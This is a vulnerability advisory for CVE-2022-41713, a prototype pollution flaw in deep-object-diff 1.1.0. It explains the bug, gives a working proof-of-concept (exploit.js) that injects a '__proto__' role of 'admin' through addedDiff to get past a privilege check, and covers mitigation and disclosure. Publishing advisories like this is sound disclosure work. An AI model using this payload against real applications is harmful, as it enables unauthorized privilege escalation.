---
slug: advisories/heldens/
title: deep-object-diff 1.1.0 - Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: heldens
product: deep-object-diff 1.1.0 - Prototype Pollution
date: 2022-11-15 09:00 COT
cveid: CVE-2022-41713
severity: 7.3
description: deep-object-diff 1.1.0    -    Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, Deep Object Diff, Prototype Pollution
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | deep-object-diff 1.1.0 - Prototype Pollution                       |
| **Code name**         | [Heldens](https://en.wikipedia.org/wiki/Oliver_Heldens)            |
| **Product**           | deep-object-diff                                                   |
| **Affected versions** | Version 1.1.0                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-11-15                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41713](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41713)                                             |

## Description

Version 1.1.0 of deep-object-diff allows an external attacker to edit
or add new properties to an object. This is possible because the
application does not properly validate incoming JSON keys, thus allowing
the `__proto__` property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when a
third party manages to modify the `__proto__` of an object. JavaScript first
checks if such a method/attribute exists in the object. If so, then it calls
it. If not, it looks in the object's prototype. If the method/attribute is
also not in the object's prototype, then the property is said to be
undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property into
an object, he will succeed in injecting or editing its properties.

## Exploitation

### exploit.js

```js
import { diff, addedDiff, deletedDiff, updatedDiff, detailedDiff } from 'deep-object-diff';

let admin = {name: "admin", role:"admin"};
let user  = {role:"user"};

let normal_user_request    = JSON.parse('{"name":"user","role":"admin"}');
let malicious_user_request = JSON.parse('{"name":"user","__proto__":{"role":"admin"}}');

const create_user = (new_user) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    if(new_user?.role && new_user?.role.toLowerCase() === "admin") {
        throw "Unauthorized Action";
    }
    user = addedDiff(user, new_user);
    console.log(user?.role);
}

try {
    create_user(normal_user_request);
} catch (error) {
    console.log(error);
}
finally {
    create_user(malicious_user_request);
}
```

## Evidence of exploitation

![Prototype-Pollution](https://user-images.githubusercontent.com/51862990/196747198-91fb55a2-b8b7-4858-8167-2a5dc7c1053c.png)

## Our security policy

We have reserved the CVE-2022-41713 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: deep-object-diff 1.1.0

* Operating System: GNU/Linux

## Mitigation

An updated version of deep-object-diff is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/mattphillips/deep-object-diff>

**Issue** <https://github.com/mattphillips/deep-object-diff/issues/85>

## Timeline

<time-lapse
  discovered="2022-10-05"
  contacted="2022-10-05"
  replied="2022-10-05"
  confirmed="2022-10-05"
  patched="2022-11-12"
  disclosure="2022-11-15">
</time-lapse>
